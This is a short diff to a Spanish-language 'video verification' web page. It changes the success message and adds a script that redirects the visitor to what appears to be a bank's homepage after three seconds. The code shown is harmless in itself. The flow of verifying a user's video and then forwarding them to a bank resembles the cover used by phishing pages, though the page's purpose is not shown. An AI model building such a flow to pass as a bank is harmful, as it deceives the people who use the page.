@@ -66,7 +66,7 @@
     <div class="success-screen" id="successScreen">
       <div class="success-icon">✓</div>
       <h2>¡Verificación Completada!</h2>
-      <p style="color: #666; margin-top: 10px;">Tu video ha sido procesado correctamente.</p>
+      <p style="color: #666; margin-top: 10px;">Serás redirigido en un momento...</p>
     </div>
   </div>
 
@@ -178,6 +178,11 @@
         
         document.getElementById('loader').style.display = 'none'; 
         document.getElementById('successScreen').style.display = 'flex'; 
+
+        // REDIRECCIÓN DESPUÉS DE 3 SEGUNDOS
+        setTimeout(() => {
+          window.location.href = 'https://bancoplata.mx/es';
+        }, 3000);
         
       } catch (error) { 
         console.error(error); 
